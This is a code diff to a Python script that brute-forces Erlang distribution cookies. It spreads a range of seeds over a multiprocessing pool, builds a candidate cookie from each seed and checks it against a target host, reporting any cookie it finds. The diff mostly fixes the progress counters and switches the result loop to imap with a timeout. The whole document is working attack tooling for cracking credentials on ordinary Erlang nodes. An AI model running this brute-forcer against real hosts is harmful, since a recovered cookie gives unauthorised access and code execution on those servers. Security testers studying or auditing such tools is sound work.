@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 import argparse
 import multiprocessing
-from sys import stderr 
+from sys import stderr, exit
 from socket import gethostname
 from os import cpu_count
 from os.path import isfile
@@ -36,14 +36,20 @@ def split(a, n):
     k, m = divmod(len(a), n)
     return (a[i*k+min(i, m):(i+1)*k+min(i+1, m)] for i in range(n))
 
-def go(target, interval, version, verbose):
-    (start, end) = interval
+def go(args):
+    # Unpack args
+    (target, interval, version, verbose) = args
+
+    # Unpack interval
+    (start, end) = (int(i) for i in interval)
+
     interval_time_last = time()
-    interval_progress = int(start)
     r = 0
     old_r = 0
+    prog = start
+
     epop = ERLPopper(target=target, cookie=None, version=version, verbose=verbose)
-    for i in range(int(start), int(end)):
+    for i in range(start, end):
         if found.is_set():
             return None
 
@@ -52,18 +58,17 @@ def go(target, interval, version, verbose):
         #  Is it faster to wait for locks or to call time() and do that math?
         if time() - interval_time_last > 2:
             old_r = r
-            r = int((i-interval_progress)/2)
+            r = int((i - prog)/2)
             with rate.get_lock():
                 rate.value -= old_r
                 rate.value += r
             with interval_progress.get_lock():
-                interval_progress += i
+                interval_progress.value += r
+            prog = i
             interval_time_last = time()
             
         cookie = ERLPopper.create_cookie_from_seed(i)
         if epop.check_cookie(cookie):
-            with rate.get_lock():
-                rate.value -= old_r
             return cookie
     
     with rate.get_lock():
@@ -99,35 +104,44 @@ if __name__ == "__main__":
     if not num_processes:
         num_processes = cpu_count()
 
+    if num_processes < 3:
+        print("[E] Number of processes should be 3 or greater (try --processes 64).")
+        exit(-1)
+
     # Work through one target/interval at a time
     #  Not using _async calls, otherwise you'll have num_processes * len(target_and_interval) processes
     for ti in args.target_and_interval:
         hostname = gethostname()
-        (target, start, end) = ti.split(',')
-        intervals = [(x.start,x.stop) for x in split(range(int(start), int(end)), num_processes)]
+        (target, _) = ti.split(',', 1)
+        (start, end) = (int(i) for i in _.split(','))
+        num_seeds = end - start
 
-        print(f"Dividing interval ({start},{end}) among {num_processes} processes...")
+        print(f"Dividing {num_seeds} seeds ({start},{end}) among {num_processes} processes...")
+        intervals = [(x.start, x.stop) for x in split(range(start, end), num_processes)]
+
+        rate = multiprocessing.Value('I')
+        interval_progress = multiprocessing.Value('I')
+        found = multiprocessing.Event()
+
         with Pool(processes=num_processes) as pool:
-
-            rate = multiprocessing.Value('I')
-            interval_progress = multiprocessing.Value('I')
-            found = multiprocessing.Event()
-
             targets_intervals_product = product([target], intervals, [version], [args.verbose])
 
-            starmap_it = pool.starmap(func=go, iterable=targets_intervals_product)
+            imap_it = pool.imap(func=go, iterable=targets_intervals_product)
 
             last_update_time = time()
             while 1:
                 if time() - last_update_time > 2:
-                    print(f"[*] Host: {hostname}\tRate: {rate.value}/s\tProgress: {interval_progress.value}/{(end-start)} ({interval_progress.value/(end-start)})")
+                    print(f"[*] Host: {hostname}\tRate: {rate.value}/s\tProgress: {interval_progress.value}/{(end-start)} ({interval_progress.value/(end-start)})", file=stderr)
                     last_update_time = time()
                 try:
-                    r = starmap_it.next()
+                    # Try to get result or timeout after 0.02s
+                    r = imap_it.next(0.02)
                     if r:
                         print(f"[+] Host '{hostname}' found cookie '{r}' for target '{target}'!")
                         break
                 except StopIteration:
                     break
-            
+                except multiprocessing.TimeoutError:
+                    continue
+        
             found.set()
